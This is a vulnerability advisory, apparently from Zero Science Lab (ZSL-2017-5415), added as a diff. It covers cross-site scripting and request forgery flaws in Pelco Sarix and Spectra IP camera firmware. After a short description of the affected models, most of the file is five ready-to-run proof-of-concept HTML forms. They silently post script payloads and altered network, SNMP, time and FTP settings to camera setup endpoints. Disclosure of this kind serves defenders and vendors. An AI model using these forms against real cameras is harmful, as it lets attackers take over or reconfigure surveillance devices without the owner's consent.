@@ -1,0 +1,168 @@
+Schneider Electric Pelco Sarix/Spectra Cameras Multiple XSS Vulnerabilities
+
+
+Vendor: Schneider Electric SE
+Product web page: https://www.pelco.com
+Affected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)
+                  Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)
+                  Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)
+                  Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)
+                  Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)
+
+Summary: Pelco offers the broadest selection of IP cameras designed
+for security surveillance in a wide variety of commercial and industrial
+settings. From our industry-leading fixed and high-speed IP cameras to
+panoramic, thermal imaging, explosionproof and more, we offer a camera
+for any environment, any lighting condition and any application.
+When nothing but the best will do. Sarix™ Enhanced Range cameras
+provide the most robust feature-set for your mission-critical applications.
+With SureVision™ 3.0, Sarix Enhanced delivers the best possible image
+in difficult lighting conditions such as a combination of bright areas,
+shaded areas, and intense light. Designed with superior reliability,
+fault tolerance, and processing speed, these rugged fixed IP cameras
+ensure you always get the video that you need.
+
+Desc: Pelco cameras suffer from multiple dom-based, stored and reflected
+XSS vulnerabilities when input passed via several parameters to several
+scripts is not properly sanitized before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in a
+user's browser session in context of an affected site.
+
+Tested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown
+           MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)
+           Lighttpd/1.4.28
+           PHP/5.3.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5415
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5415.php
+
+
+07.04.2017
+
+--
+
+
+CSRF/XSS on username parameter:
+-------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/network/dot1x/update" method="POST">
+      <input type="hidden" name="dot1x" value="on" />
+      <input type="hidden" name="protocol" value="EAP&#45;TLS" />
+      <input type="hidden" name="inner&#95;auth" value="CHAP" />
+      <input type="hidden" name="username" value='"><script>alert(1)</script>' />
+      <input type="hidden" name="password" value="blah" />
+      <input type="hidden" name="anonymous&#95;id" value="&#13;" />
+      <input type="hidden" name="ca&#95;certificate" value="test" />
+      <input type="hidden" name="client&#95;certificate" value="test" />
+      <input type="hidden" name="private&#95;key" value="test" />
+      <input type="hidden" name="private&#95;key&#95;password" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+CSRF/XSS on gateway, hostname, ip_address, nameservers, http_port, rtsp_port and subnet_mask parameter:
+-------------------------------------------------------------------------------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/network/general/update" method="POST">
+      <input type="hidden" name="hostname" value='"><script>alert(2)</script>' />
+      <input type="hidden" name="http&#95;port" value='"><script>alert(3)</script>' />
+      <input type="hidden" name="rtsp&#95;port" value='"><script>alert(4)</script>' />
+      <input type="hidden" name="dhcp" value="off" />
+      <input type="hidden" name="ip&#95;address" value='"><script>alert(5)</script>' />
+      <input type="hidden" name="subnet&#95;mask" value='"><script>alert(6)</script>' />
+      <input type="hidden" name="gateway" value='"><script>alert(7)</script>' />
+      <input type="hidden" name="nameservers" value='"><script>alert(8)</script>' />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+CSRF/XSS on version parameter:
+------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/network/snmp/update" method="POST">
+      <input type="hidden" name="version" value='";alert(9)//' />
+      <input type="hidden" name="v2&#95;community&#95;string" value="public" />
+      <input type="hidden" name="v2&#95;receiver&#95;address" value="" />
+      <input type="hidden" name="v2&#95;trap&#95;community&#95;string" value="trapbratce" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+CSRF/XSS on device_name, ntp_server, region, smtp_server and zone parameter:
+----------------------------------------------------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/system/general/update" method="POST">
+      <input type="hidden" name="device&#95;name" value='ZSL"><script>alert(10)</script>' />
+      <input type="hidden" name="enable&#95;leds" value="on" />
+      <input type="hidden" name="smtp&#95;server" value='"><script>alert(11)</script>' />
+      <input type="hidden" name="ntp&#95;server&#95;from&#95;dhcp" value="false" />
+      <input type="hidden" name="ntp&#95;server" value="';alert(12)//'" />
+      <input type="hidden" name="region" value="Macedonia';alert(13)//" />
+      <input type="hidden" name="zone" value="Kumanovo';alert(14)//" />
+      <input type="hidden" name="enable&#95;time&#95;overlay" value="on" />
+      <input type="hidden" name="enable&#95;name&#95;overlay" value="off" />
+      <input type="hidden" name="position" value="topright" />
+      <input type="hidden" name="date&#95;format" value="0" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+XSS on ftp_base_path, ftp_server, ftp_username, ftp_password and name parameter:
+--------------------------------------------------------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/events/handlers/update" method="POST">
+      <input type="hidden" name="id" value="" />
+      <input type="hidden" name="relay&#95;sentinel" value="relay&#95;sentinel" />
+      <input type="hidden" name="name" value='"><script>alert(15)</script>' />
+      <input type="hidden" name="type" value="Ftp" />
+      <input type="hidden" name="email&#95;to" value="" />
+      <input type="hidden" name="email&#95;from" value="" />
+      <input type="hidden" name="email&#95;subject" value="" />
+      <input type="hidden" name="email&#95;message" value="" />
+      <input type="hidden" name="dest&#95;name" value="IMG&#37;m&#37;d&#37;Y&#37;H&#37;M&#37;S&#46;jpg" />
+      <input type="hidden" name="limit&#95;size" value="" />
+      <input type="hidden" name="limit&#95;size&#95;scale" value="K" />
+      <input type="hidden" name="ftp&#95;server" value='"><script>alert(16)</script>' />
+      <input type="hidden" name="ftp&#95;username" value='"><script>alert(17)</script>' />
+      <input type="hidden" name="ftp&#95;password" value='"><script>alert(18)</script>' />
+      <input type="hidden" name="ftp&#95;base&#95;path" value='"><script>alert(19)</script>' />
+      <input type="hidden" name="ftp&#95;dest&#95;name" value="IMG&#37;m&#37;d&#37;Y&#37;H&#37;M&#37;S&#46;jpg" />
+      <input type="hidden" name="relay&#95;bankName" value="GPIO" />
+      <input type="hidden" name="relay&#95;index" value="0" />
+      <input type="hidden" name="relay&#95;on&#95;time" value="0&#46;1" />
+      <input type="hidden" name="relay&#95;off&#95;time" value="0&#46;1" />
+      <input type="hidden" name="relay&#95;pulse&#95;count" value="" />
+      <input type="hidden" name="filter&#95;start0" value="" />
+      <input type="hidden" name="filter&#95;stop0" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
